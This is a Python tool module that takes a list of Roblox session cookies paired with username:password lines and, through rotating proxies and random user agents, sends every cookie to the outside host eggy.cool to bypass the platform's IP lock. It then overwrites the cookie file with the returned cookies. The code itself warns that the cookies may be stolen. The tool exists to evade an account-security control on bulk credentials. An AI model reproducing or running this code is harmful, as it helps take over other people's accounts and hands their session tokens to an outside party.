import os
import concurrent.futures
import httpc
import random
from Tool import Tool
from utils import Utils
import click
import re
from config import ConfigType

class CookieRegionUnlocker(Tool):
    def __init__(self, app):
        super().__init__("Cookie Region Unlocker", "(UNSAFE & Dualhooked) Unlock the region of your cookies", app)

        self.unlocked_cookies_file_path = os.path.join(self.files_directory, "unlocked-cookies.txt")

    def run(self):
        self.timeout = ConfigType.integer(self.config, "timeout")
        self.use_proxy = ConfigType.boolean(self.config, "use_proxy")
        self.max_threads = ConfigType.integer(self.config, "max_threads")

        cookies, lines = self.get_cookies(None, True)
        proxies_lines = self.get_proxies_lines() if self.use_proxy else [None]

        click.secho("Warning: your cookies will be exposed to eggy.cool for unlocking, so they might be stolen.", fg='yellow')

        f = open(self.unlocked_cookies_file_path, 'w')
        f.seek(0)
        f.truncate()

        req_sent = 0
        req_failed = 0
        total_req = len(cookies)

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as self.executor:
            results = [self.executor.submit(self.unlock_cookie, cookie, random.choice(proxies_lines)) for cookie in cookies]

            for future in concurrent.futures.as_completed(results):
                try:
                    has_worked, response_text, old_cookie = future.result()
                except Exception as err:
                    has_worked, response_text = False, str(err)

                if has_worked:
                    req_sent += 1

                    cookie = response_text
                    # search for the user:pass: part of the line
                    pattern = re.compile(rf'(.*?){re.escape(old_cookie)}.*')
                    matched_lines = [pattern.search(line) for line in lines if pattern.search(line)]
                    user_pass_part = matched_lines[0].group(1)

                    f.write(user_pass_part+cookie+"\n")
                    f.flush()
                else:
                    req_failed += 1

                self.print_status(req_sent, req_failed, total_req, response_text, has_worked, "Unlocked")

        f.close()

        # replace cookies
        with open(self.cookies_file_path, 'w') as destination_file:
            with open(self.unlocked_cookies_file_path, 'r') as source_file:
                destination_file.seek(0)
                destination_file.truncate()
                destination_file.write(source_file.read())

        os.remove(self.unlocked_cookies_file_path)

    @Utils.handle_exception(2)
    def unlock_cookie(self, cookie, proxies_line):
        proxies = self.convert_line_to_proxy(proxies_line) if proxies_line else None

        with httpc.Session(proxies=proxies) as client:
            # Refresh using rbxfresh.net
            req_url = "https://eggy.cool/iplockbypass"
            req_params = {
                "cookie": cookie,
            }
            req_headers = {
                "User-Agent": httpc.get_random_user_agent()
            }

            res = client.get(req_url, headers=req_headers, params=req_params, timeout=self.timeout)

            if "Invalid Cookie" in res.text or res.status_code != 200:
                return False, res.text, cookie

            new_cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"+res.text

        return True, new_cookie, cookie